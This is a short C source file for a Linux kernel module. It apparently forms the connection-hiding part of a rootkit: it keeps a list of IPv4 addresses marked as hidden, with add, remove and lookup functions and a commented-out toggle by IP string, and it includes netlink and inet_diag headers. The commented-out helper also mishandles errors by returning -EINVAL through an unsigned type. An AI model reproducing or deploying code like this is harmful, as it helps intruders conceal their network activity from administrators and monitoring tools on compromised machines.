#include <linux/version.h>
#include <linux/inet.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>

#include "network.h"
#include "string_helpers.h"

void network_hide_add(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    hc = kmalloc(sizeof(*hc), GFP_KERNEL);

	if (!hc)
	    return;

	hc->addr = addr;
    list_add(&hc->list, &hidden_conn_list);
}

void network_hide_remove(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (addr.sin_addr.s_addr == hc->addr.sin_addr.s_addr) {
				list_del(&hc->list);
				kfree(hc);
				break;
		}
	}
}

int is_addr_hidden(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (addr.sin_addr.s_addr == hc->addr.sin_addr.s_addr)
			return 1;
	}

	return 0;
}

/*
unsigned int _inet4_pton(char *src)
{
    unsigned int dst;
	int srclen = strlen(src);

	if (srclen > INET_ADDRSTRLEN)
		return -EINVAL;

	if (in4_pton(src, srclen, (u8 *)&dst, -1, NULL) == 0)
		return -EINVAL;

	return dst;
}

void hide_conn(char *ip_str)
{
	unsigned int ip;
	struct sockaddr_in addr;

	if ((ip = _inet4_pton(ip_str)) > 0) {
		addr.sin_addr.s_addr = ip;

		if (is_addr_hidden(addr))
			network_hide_remove(addr);
		else
			network_hide_add(addr);
	}
}
*/